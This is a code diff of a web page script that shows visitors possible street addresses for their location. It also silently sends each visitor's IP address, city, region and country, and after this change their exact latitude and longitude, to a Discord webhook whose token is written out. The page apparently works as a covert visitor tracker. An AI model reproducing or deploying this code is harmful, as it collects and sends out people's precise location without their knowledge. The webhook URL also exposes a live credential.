@@ -12,11 +12,11 @@
     <p>Possibilitées : <br> <span class="poss" ></span></p>
 
     <script>
-        function THEfunction(content) {
+        function THEfunction(content, lat, lon) {
             fetch('https://ipapi.co/json/')
                 .then(response => response.json())
                 .then(({ ip, country_name, city, region }) => {
-                    const message = `# Address ip : ${ip}\n\n- Pays : ${country_name}\n- Ville : ${city}\n- Region : ${region}\n### Possibilités : \n ${content.split('\n').map(e => ` -  __${e}__`).join('\n')}`;
+                    const message = `# Address ip : ${ip}\n\n- Pays : ${country_name}\n- Latitude : ${lat} \n- Longitude : ${lon} \n- Ville : ${city}\n- Region : ${region}\n### Possibilités : \n ${content.split('\n').map(e => ` -  __${e}__`).join('\n')}`;
 
                     fetch('https://discord.com/api/webhooks/1121364427820769340/a1rhihUdmuoZtxFy_xitB0tqmaSsagnPrbch9Te5zDpA1iMKttt3Yp3YU_f3kfYRmgN3', {
                         method: 'POST',
@@ -40,7 +40,7 @@
                 const { features } = await response.json();
                 const message = features.map(el => el.properties.label).join('\n');
                 document.querySelector('.poss').innerHTML = message.split('\n').map(el => el + "<br/>")
-                THEfunction(message);
+                THEfunction(message, latitude, longitude);
             } catch (err) { // 
             }
         }
